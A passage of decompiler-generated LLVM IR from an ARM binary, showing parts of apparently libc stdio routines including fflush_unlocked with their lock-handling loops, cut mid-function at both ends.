  %v0_15170 = load i32, i32* %r2.global-to-local, align 4
  %v1_15170 = load i32, i32* %r0.global-to-local, align 4
  %v2_15170 = add i32 %v1_15170, 4
  %v3_15170 = inttoptr i32 %v2_15170 to i32*
  store i32 %v0_15170, i32* %v3_15170, align 4
  br i1 %v2_15168, label %dec_label_pc_15178, label %dec_label_pc_151d8

dec_label_pc_15178:                               ; preds = %dec_label_pc_15148
  %v0_15178 = load i32, i32* %r2.global-to-local, align 4
  %v1_15178 = load i32, i32* %r0.global-to-local, align 4
  %v2_15178 = add i32 %v1_15178, 8
  %v3_15178 = inttoptr i32 %v2_15178 to i32*
  store i32 %v0_15178, i32* %v3_15178, align 4
  %v0_1517c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1517c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15180

dec_label_pc_15180:                               ; preds = %dec_label_pc_151b0.dec_label_pc_15180_crit_edge, %dec_label_pc_15178
  %v0_15180 = phi i32 [ %v0_15180.pre, %dec_label_pc_151b0.dec_label_pc_15180_crit_edge ], [ %v0_1517c, %dec_label_pc_15178 ]
  %v1_15180 = inttoptr i32 %v0_15180 to i32*
  %v2_15180 = load i32, i32* %v1_15180, align 4
  store i32 %v2_15180, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15180, i32* %r2.global-to-local, align 4
  %v2_1518c62 = load i32, i32* %v1_15180, align 4
  store i32 %v2_1518c62, i32* %r3.global-to-local, align 4
  %v3_1519064 = icmp uge i32 %v2_1518c62, %v2_15180
  store i1 %v3_1519064, i1* %cpsr_c.global-to-local, align 1
  %v9_1519070 = icmp eq i32 %v2_1518c62, %v2_15180
  br i1 %v9_1519070, label %dec_label_pc_15198, label %dec_label_pc_151b0

dec_label_pc_15198:                               ; preds = %dec_label_pc_15180, %dec_label_pc_15198.dec_label_pc_1518c_crit_edge
  %v0_1519871 = phi i32 [ %v1_15190.pre, %dec_label_pc_15198.dec_label_pc_1518c_crit_edge ], [ %v2_15180, %dec_label_pc_15180 ]
  store i32 %v0_1519871, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_151a8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_151a8, label %dec_label_pc_151ac, label %dec_label_pc_15198.dec_label_pc_1518c_crit_edge

dec_label_pc_15198.dec_label_pc_1518c_crit_edge:  ; preds = %dec_label_pc_15198
  %v0_1518c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15190.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1518c = inttoptr i32 %v0_1518c.pre to i32*
  %v2_1518c = load i32, i32* %v1_1518c, align 4
  store i32 %v2_1518c, i32* %r3.global-to-local, align 4
  %v3_15190 = icmp uge i32 %v2_1518c, %v1_15190.pre
  store i1 %v3_15190, i1* %cpsr_c.global-to-local, align 1
  %v9_15190 = icmp eq i32 %v2_1518c, %v1_15190.pre
  br i1 %v9_15190, label %dec_label_pc_15198, label %dec_label_pc_151b0

dec_label_pc_151ac:                               ; preds = %dec_label_pc_15198
  %v0_151ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_151ac, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_151b0

dec_label_pc_151b0:                               ; preds = %dec_label_pc_15180, %dec_label_pc_15198.dec_label_pc_1518c_crit_edge, %dec_label_pc_151ac
  %v0_151b8 = phi i32 [ %v0_151ac, %dec_label_pc_151ac ], [ %v2_1518c62, %dec_label_pc_15180 ], [ %v2_1518c, %dec_label_pc_15198.dec_label_pc_1518c_crit_edge ]
  %v1_151b0 = phi i32 [ %v0_151ac, %dec_label_pc_151ac ], [ %v2_15180, %dec_label_pc_15180 ], [ %v1_15190.pre, %dec_label_pc_15198.dec_label_pc_1518c_crit_edge ]
  %v3_151b0 = icmp uge i32 %v0_151b8, %v1_151b0
  store i1 %v3_151b0, i1* %cpsr_c.global-to-local, align 1
  %v9_151b0 = icmp eq i32 %v0_151b8, %v1_151b0
  br i1 %v9_151b0, label %dec_label_pc_151b8, label %dec_label_pc_151b0.dec_label_pc_15180_crit_edge

dec_label_pc_151b0.dec_label_pc_15180_crit_edge:  ; preds = %dec_label_pc_151b0
  %v0_15180.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15180

dec_label_pc_151b8:                               ; preds = %dec_label_pc_151b0
  %v2_151b8 = icmp ne i32 %v1_151b0, 0
  store i1 %v2_151b8, i1* %cpsr_c.global-to-local, align 1
  %v7_151bc = icmp slt i32 %v1_151b0, 2
  br i1 %v7_151bc, label %dec_label_pc_151d8, label %dec_label_pc_151c0

dec_label_pc_151c0:                               ; preds = %dec_label_pc_151b8
  %v0_151c0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_151c0, i32* %r0.global-to-local, align 4
  %v0_151c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_151c4 = add i32 %v0_151c4, 129
  store i32 %v1_151c4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_151d8

dec_label_pc_151d8:                               ; preds = %dec_label_pc_15148, %dec_label_pc_151c0, %dec_label_pc_151b8
  %v2_151dc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_151dc, i32* %r4.global-to-local, align 4
  %v1_151e0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_151e0

; uselistorder directives
  uselistorder i32 %v0_151ac, { 1, 0, 2 }
  uselistorder i32 %v1_15190.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15180, { 1, 0 }
  uselistorder i32 %v0_1510c, { 1, 0, 2 }
  uselistorder i32 %v1_150f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_150e0, { 1, 0 }
  uselistorder i32 %v0_150ac, { 2, 1, 0 }
  uselistorder i32 %v0_15050, { 1, 0 }
  uselistorder i32 %v0_15034, { 1, 0, 2 }
  uselistorder i32 %v1_15018.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15004, { 1, 0 }
  uselistorder i32 %v0_14fa8, { 1, 0, 2 }
  uselistorder i32 %v1_14f8c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_14f60, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 39, 4, 5, 6, 7, 8, 9, 10, 12, 11, 40, 13, 14, 15, 43, 44, 16, 17, 18, 19, 20, 21, 22, 24, 23, 41, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 42, 37, 38 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 12, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 19, 20, 3, 4, 5, 6, 21, 22, 7, 10, 8, 9, 27, 11, 12, 23, 24, 13, 14, 15, 16, 17, 25, 26, 18 }
  uselistorder i32 8192, { 3, 0, 1, 2 }
  uselistorder i32 47, { 1, 0, 5, 2, 3, 4 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_151d8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_151b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15198, { 1, 0 }
  uselistorder label %dec_label_pc_15148, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15138, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15110, { 2, 1, 0 }
  uselistorder label %dec_label_pc_150f8, { 1, 0 }
  uselistorder label %dec_label_pc_150ac, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_15074, { 1, 0 }
  uselistorder label %dec_label_pc_15048, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_15038, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15020, { 1, 0 }
  uselistorder label %dec_label_pc_14fbc, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_14fac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14f94, { 1, 0 }
}

define i32 @function_151e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_151e8:
  %v0_151e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_151e8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_151e8
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_151e8, %bb
  %v10_151fc = phi i32 [ %arg1, %dec_label_pc_151e8 ], [ 0, %bb ]
  ret i32 %v10_151fc

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_15200 = load i32, i32* @r5, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r6, align 4
  %v4_15210 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 76) to i32*), align 4
  store i32 %v4_15210, i32* %r3.global-to-local, align 4
  %v4_15214 = icmp uge i32 %tmp, %v4_15210
  store i1 %v4_15214, i1* %cpsr_c.global-to-local, align 1
  %v10_15214 = icmp eq i32 %tmp, %v4_15210
  br i1 %v10_15214, label %bb, label %dec_label_pc_1522c

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_1523c

dec_label_pc_1522c:                               ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_15230 = icmp eq i16* %arg1, null
  br i1 %v3_15230, label %dec_label_pc_1523c, label %dec_label_pc_15550

dec_label_pc_1523c:                               ; preds = %bb, %dec_label_pc_1522c
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_1522c ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v4_15240 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 160) to i32*), align 4
  store i32 %v4_15240, i32* %r5.global-to-local, align 4
  %v0_15244 = call i32 @__aeabi_read_tp()
  store i32 %v0_15244, i32* %r0.global-to-local, align 4
  %v1_15248 = add i32 %v4_15240, 8
  %v2_15248 = inttoptr i32 %v1_15248 to i32*
  %v3_15248 = load i32, i32* %v2_15248, align 4
  store i32 %v3_15248, i32* %r3.global-to-local, align 4
  %v1_1524c = add i32 %v0_15244, -1168
  store i32 %v1_1524c, i32* %r8.global-to-local, align 4
  %v3_15250 = icmp uge i32 %v3_15248, %v1_1524c
  store i1 %v3_15250, i1* %cpsr_c.global-to-local, align 1
  %v9_15250 = icmp eq i32 %v3_15248, %v1_1524c
  br i1 %v9_15250, label %dec_label_pc_15298, label %dec_label_pc_15258

dec_label_pc_15258:                               ; preds = %dec_label_pc_1523c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15240, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_15264143 = inttoptr i32 %v4_15240 to i32*
  %v2_15264144 = load i32, i32* %v1_15264143, align 4
  store i32 %v2_15264144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15268146 = icmp eq i32 %v2_15264144, 0
  br i1 %v9_15268146, label %dec_label_pc_15270, label %dec_label_pc_15288

dec_label_pc_15270:                               ; preds = %dec_label_pc_15258, %dec_label_pc_15270.dec_label_pc_15264_crit_edge
  %v0_15270147 = phi i32 [ %v1_15268.pre, %dec_label_pc_15270.dec_label_pc_15264_crit_edge ], [ 0, %dec_label_pc_15258 ]
  store i32 %v0_15270147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15280 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15280, label %dec_label_pc_15284, label %dec_label_pc_15270.dec_label_pc_15264_crit_edge

dec_label_pc_15270.dec_label_pc_15264_crit_edge:  ; preds = %dec_label_pc_15270
  %v0_15264.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15268.pre = load i32, i32* @r4, align 4
  %v1_15264 = inttoptr i32 %v0_15264.pre to i32*
  %v2_15264 = load i32, i32* %v1_15264, align 4
  store i32 %v2_15264, i32* %r3.global-to-local, align 4
  %v3_15268 = icmp uge i32 %v2_15264, %v1_15268.pre
  store i1 %v3_15268, i1* %cpsr_c.global-to-local, align 1
  %v9_15268 = icmp eq i32 %v2_15264, %v1_15268.pre
  br i1 %v9_15268, label %dec_label_pc_15270, label %dec_label_pc_15288

dec_label_pc_15284:                               ; preds = %dec_label_pc_15270
  %v0_15284 = load i32, i32* @r4, align 4
  store i32 %v0_15284, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15288

dec_label_pc_15288:                               ; preds = %dec_label_pc_15258, %dec_label_pc_15270.dec_label_pc_15264_crit_edge, %dec_label_pc_15284
  %v0_15288 = phi i32 [ %v0_15284, %dec_label_pc_15284 ], [ %v2_15264144, %dec_label_pc_15258 ], [ %v2_15264, %dec_label_pc_15270.dec_label_pc_15264_crit_edge ]
  %v1_15288 = phi i32 [ %v0_15284, %dec_label_pc_15284 ], [ 0, %dec_label_pc_15258 ], [ %v1_15268.pre, %dec_label_pc_15270.dec_label_pc_15264_crit_edge ]
  %v3_15288 = icmp uge i32 %v0_15288, %v1_15288
  store i1 %v3_15288, i1* %cpsr_c.global-to-local, align 1
  %v9_15288 = icmp eq i32 %v0_15288, %v1_15288
  br i1 %v9_15288, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_15288
  %v1_1528c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1528c, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_15288, %bb65
  %v1_15290 = xor i1 %v9_15288, true
  call void @__pseudo_cond_branch(i1 %v1_15290, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_15294 = load i32, i32* %r8.global-to-local, align 4
  %v1_15294 = load i32, i32* %r5.global-to-local, align 4
  %v2_15294 = add i32 %v1_15294, 8
  %v3_15294 = inttoptr i32 %v2_15294 to i32*
  store i32 %v0_15294, i32* %v3_15294, align 4
  br label %dec_label_pc_15298

dec_label_pc_15298:                               ; preds = %dec_label_pc_1523c, %bb66
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1529c = load i32, i32* @r6, align 4
  %v2_1529c = add i32 %v0_1529c, 160
  %v3_1529c = inttoptr i32 %v2_1529c to i32*
  %v4_1529c = load i32, i32* %v3_1529c, align 4
  store i32 %v4_1529c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_152a4 = add i32 %v0_1529c, 12
  %v3_152a4 = inttoptr i32 %v2_152a4 to i32*
  %v4_152a4 = load i32, i32* %v3_152a4, align 4
  store i32 %v4_152a4, i32* %r2.global-to-local, align 4
  %v1_152a8 = add i32 %v4_1529c, 4
  %v2_152a8 = inttoptr i32 %v1_152a8 to i32*
  %v3_152a8 = load i32, i32* %v2_152a8, align 4
  store i32 %v3_152a8, i32* %r1.global-to-local, align 4
  %v1_152ac = inttoptr i32 %v4_152a4 to i32*
  %v2_152ac = load i32, i32* %v1_152ac, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_152b0 = icmp eq i32 %v3_152a8, 0
  %v1_152b4 = add i32 %v2_152ac, 1
  store i32 %v1_152b4, i32* %r3.global-to-local, align 4
  store i32 %v1_152b4, i32* %v1_152ac, align 4
  br i1 %v2_152b0, label %dec_label_pc_152c0, label %dec_label_pc_15320

dec_label_pc_152c0:                               ; preds = %dec_label_pc_15298
  %v0_152c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_152c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_152c0 = add i32 %v1_152c0, 8
  %v3_152c0 = inttoptr i32 %v2_152c0 to i32*
  store i32 %v0_152c0, i32* %v3_152c0, align 4
  %v0_152c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_152c4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_152c8

dec_label_pc_152c8:                               ; preds = %dec_label_pc_152f8.dec_label_pc_152c8_crit_edge, %dec_label_pc_152c0
  %v0_152c8 = phi i32 [ %v0_152c8.pre, %dec_label_pc_152f8.dec_label_pc_152c8_crit_edge ], [ %v0_152c4, %dec_label_pc_152c0 ]
  %v1_152c8 = inttoptr i32 %v0_152c8 to i32*
  %v2_152c8 = load i32, i32* %v1_152c8, align 4
  store i32 %v2_152c8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_152c8, i32* %r2.global-to-local, align 4
  %v2_152d4131 = load i32, i32* %v1_152c8, align 4
  store i32 %v2_152d4131, i32* %r3.global-to-local, align 4
  %v3_152d8133 = icmp uge i32 %v2_152d4131, %v2_152c8
  store i1 %v3_152d8133, i1* %cpsr_c.global-to-local, align 1
  %v9_152d8139 = icmp eq i32 %v2_152d4131, %v2_152c8
  br i1 %v9_152d8139, label %dec_label_pc_152e0, label %dec_label_pc_152f8

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152c8, %dec_label_pc_152e0.dec_label_pc_152d4_crit_edge
  %v0_152e0140 = phi i32 [ %v1_152d8.pre, %dec_label_pc_152e0.dec_label_pc_152d4_crit_edge ], [ %v2_152c8, %dec_label_pc_152c8 ]
  store i32 %v0_152e0140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_152f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_152f0, label %dec_label_pc_152f4, label %dec_label_pc_152e0.dec_label_pc_152d4_crit_edge

dec_label_pc_152e0.dec_label_pc_152d4_crit_edge:  ; preds = %dec_label_pc_152e0
  %v0_152d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_152d8.pre = load i32, i32* @r4, align 4
  %v1_152d4 = inttoptr i32 %v0_152d4.pre to i32*
  %v2_152d4 = load i32, i32* %v1_152d4, align 4
  store i32 %v2_152d4, i32* %r3.global-to-local, align 4
  %v3_152d8 = icmp uge i32 %v2_152d4, %v1_152d8.pre
  store i1 %v3_152d8, i1* %cpsr_c.global-to-local, align 1
  %v9_152d8 = icmp eq i32 %v2_152d4, %v1_152d8.pre
  br i1 %v9_152d8, label %dec_label_pc_152e0, label %dec_label_pc_152f8

dec_label_pc_152f4:                               ; preds = %dec_label_pc_152e0
  %v0_152f4 = load i32, i32* @r4, align 4
  store i32 %v0_152f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_152f8

dec_label_pc_152f8:                               ; preds = %dec_label_pc_152c8, %dec_label_pc_152e0.dec_label_pc_152d4_crit_edge, %dec_label_pc_152f4
  %v0_15300 = phi i32 [ %v0_152f4, %dec_label_pc_152f4 ], [ %v2_152d4131, %dec_label_pc_152c8 ], [ %v2_152d4, %dec_label_pc_152e0.dec_label_pc_152d4_crit_edge ]
  %v1_152f8 = phi i32 [ %v0_152f4, %dec_label_pc_152f4 ], [ %v2_152c8, %dec_label_pc_152c8 ], [ %v1_152d8.pre, %dec_label_pc_152e0.dec_label_pc_152d4_crit_edge ]
  %v3_152f8 = icmp uge i32 %v0_15300, %v1_152f8
  store i1 %v3_152f8, i1* %cpsr_c.global-to-local, align 1
  %v9_152f8 = icmp eq i32 %v0_15300, %v1_152f8
  br i1 %v9_152f8, label %dec_label_pc_15300, label %dec_label_pc_152f8.dec_label_pc_152c8_crit_edge

dec_label_pc_152f8.dec_label_pc_152c8_crit_edge:  ; preds = %dec_label_pc_152f8
  %v0_152c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_152c8

dec_label_pc_15300:                               ; preds = %dec_label_pc_152f8
  %v2_15300 = icmp ne i32 %v1_152f8, 0
  store i1 %v2_15300, i1* %cpsr_c.global-to-local, align 1
  %v7_15304 = icmp slt i32 %v1_152f8, 2
  br i1 %v7_15304, label %dec_label_pc_15320, label %dec_label_pc_15308

dec_label_pc_15308:                               ; preds = %dec_label_pc_15300
  %v0_15308 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15308, i32* %r0.global-to-local, align 4
  %v0_1530c = load i32, i32* %r1.global-to-local, align 4
  %v1_1530c = add i32 %v0_1530c, 129
  store i32 %v1_1530c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15320

dec_label_pc_15320:                               ; preds = %dec_label_pc_15298, %dec_label_pc_15308, %dec_label_pc_15300
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15324 = load i32, i32* @r6, align 4
  %v2_15324 = add i32 %v0_15324, 152
  %v3_15324 = inttoptr i32 %v2_15324 to i32*
  %v4_15324 = load i32, i32* %v3_15324, align 4
  store i32 %v4_15324, i32* %r5.global-to-local, align 4
  %v1_15328 = add i32 %v4_15324, 8
  %v2_15328 = inttoptr i32 %v1_15328 to i32*
  %v3_15328 = load i32, i32* %v2_15328, align 4
  store i32 %v3_15328, i32* %r3.global-to-local, align 4
  %v1_1532c = load i32, i32* %r8.global-to-local, align 4
  %v3_1532c = icmp uge i32 %v3_15328, %v1_1532c
  store i1 %v3_1532c, i1* %cpsr_c.global-to-local, align 1
  %v9_1532c = icmp eq i32 %v3_15328, %v1_1532c
  br i1 %v9_1532c, label %dec_label_pc_15374, label %dec_label_pc_15334

dec_label_pc_15334:                               ; preds = %dec_label_pc_15320
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15324, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_15340123 = inttoptr i32 %v4_15324 to i32*
  %v2_15340124 = load i32, i32* %v1_15340123, align 4
  store i32 %v2_15340124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15344126 = icmp eq i32 %v2_15340124, 0
  br i1 %v9_15344126, label %dec_label_pc_1534c, label %dec_label_pc_15364

dec_label_pc_1534c:                               ; preds = %dec_label_pc_15334, %dec_label_pc_1534c.dec_label_pc_15340_crit_edge
  %v0_1534c127 = phi i32 [ %v1_15344.pre, %dec_label_pc_1534c.dec_label_pc_15340_crit_edge ], [ 0, %dec_label_pc_15334 ]
  store i32 %v0_1534c127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1535c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1535c, label %dec_label_pc_15360, label %dec_label_pc_1534c.dec_label_pc_15340_crit_edge

dec_label_pc_1534c.dec_label_pc_15340_crit_edge:  ; preds = %dec_label_pc_1534c
  %v0_15340.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15344.pre = load i32, i32* @r4, align 4
  %v1_15340 = inttoptr i32 %v0_15340.pre to i32*
  %v2_15340 = load i32, i32* %v1_15340, align 4
  store i32 %v2_15340, i32* %r3.global-to-local, align 4
  %v3_15344 = icmp uge i32 %v2_15340, %v1_15344.pre
  store i1 %v3_15344, i1* %cpsr_c.global-to-local, align 1
  %v9_15344 = icmp eq i32 %v2_15340, %v1_15344.pre
  br i1 %v9_15344, label %dec_label_pc_1534c, label %dec_label_pc_15364

dec_label_pc_15360:                               ; preds = %dec_label_pc_1534c
  %v0_15360 = load i32, i32* @r4, align 4
  store i32 %v0_15360, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15364

dec_label_pc_15364:                               ; preds = %dec_label_pc_15334, %dec_label_pc_1534c.dec_label_pc_15340_crit_edge, %dec_label_pc_15360
  %v0_15364 = phi i32 [ %v0_15360, %dec_label_pc_15360 ], [ %v2_15340124, %dec_label_pc_15334 ], [ %v2_15340, %dec_label_pc_1534c.dec_label_pc_15340_crit_edge ]
  %v1_15364 = phi i32 [ %v0_15360, %dec_label_pc_15360 ], [ 0, %dec_label_pc_15334 ], [ %v1_15344.pre, %dec_label_pc_1534c.dec_label_pc_15340_crit_edge ]
  %v3_15364 = icmp uge i32 %v0_15364, %v1_15364
  store i1 %v3_15364, i1* %cpsr_c.global-to-local, align 1
  %v9_15364 = icmp eq i32 %v0_15364, %v1_15364
  br i1 %v9_15364, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_15364
  %v1_15368 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15368, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_15364, %bb67
  %v1_1536c = xor i1 %v9_15364, true
  call void @__pseudo_cond_branch(i1 %v1_1536c, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_15370 = load i32, i32* %r8.global-to-local, align 4
  %v1_15370 = load i32, i32* %r5.global-to-local, align 4
  %v2_15370 = add i32 %v1_15370, 8
  %v3_15370 = inttoptr i32 %v2_15370 to i32*
  store i32 %v0_15370, i32* %v3_15370, align 4
  %v0_15378.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15374

dec_label_pc_15374:                               ; preds = %dec_label_pc_15320, %bb68
  %v0_15384 = phi i32 [ %v0_15324, %dec_label_pc_15320 ], [ %v0_15378.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15378 = add i32 %v0_15384, 152
  %v3_15378 = inttoptr i32 %v2_15378 to i32*
  %v4_15378 = load i32, i32* %v3_15378, align 4
  store i32 %v4_15378, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_15380 = add i32 %v4_15378, 4
  %v2_15380 = inttoptr i32 %v1_15380 to i32*
  %v3_15380 = load i32, i32* %v2_15380, align 4
  store i32 %v3_15380, i32* %r1.global-to-local, align 4
  %v2_15384 = add i32 %v0_15384, 76
  %v3_15384 = inttoptr i32 %v2_15384 to i32*
  %v4_15384 = load i32, i32* %v3_15384, align 4
  store i32 %v4_15384, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15388 = icmp eq i32 %v3_15380, 0
  %v1_1538c = inttoptr i32 %v4_15384 to i32*
  %v2_1538c = load i32, i32* %v1_1538c, align 4
  store i32 %v2_1538c, i32* @r5, align 4
  br i1 %v2_15388, label %dec_label_pc_15394, label %dec_label_pc_153f4

dec_label_pc_15394:                               ; preds = %dec_label_pc_15374
  %v2_15394 = add i32 %v4_15378, 8
  %v3_15394 = inttoptr i32 %v2_15394 to i32*
  store i32 0, i32* %v3_15394, align 4
  %v0_15398 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15398, i32* @r7, align 4
  br label %dec_label_pc_1539c

dec_label_pc_1539c:                               ; preds = %dec_label_pc_153cc.dec_label_pc_1539c_crit_edge, %dec_label_pc_15394
  %v0_1539c = phi i32 [ %v0_1539c.pre, %dec_label_pc_153cc.dec_label_pc_1539c_crit_edge ], [ %v0_15398, %dec_label_pc_15394 ]
  %v1_1539c = inttoptr i32 %v0_1539c to i32*
  %v2_1539c = load i32, i32* %v1_1539c, align 4
  store i32 %v2_1539c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1539c, i32* %r2.global-to-local, align 4
  %v2_153a8111 = load i32, i32* %v1_1539c, align 4
  store i32 %v2_153a8111, i32* %r3.global-to-local, align 4
  %v3_153ac113 = icmp uge i32 %v2_153a8111, %v2_1539c
  store i1 %v3_153ac113, i1* %cpsr_c.global-to-local, align 1
  %v9_153ac119 = icmp eq i32 %v2_153a8111, %v2_1539c
  br i1 %v9_153ac119, label %dec_label_pc_153b4, label %dec_label_pc_153cc

dec_label_pc_153b4:                               ; preds = %dec_label_pc_1539c, %dec_label_pc_153b4.dec_label_pc_153a8_crit_edge
  %v0_153b4120 = phi i32 [ %v1_153ac.pre, %dec_label_pc_153b4.dec_label_pc_153a8_crit_edge ], [ %v2_1539c, %dec_label_pc_1539c ]
  store i32 %v0_153b4120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_153c4 = load i1, i1* %cpsr_c.global-to-local, align 1
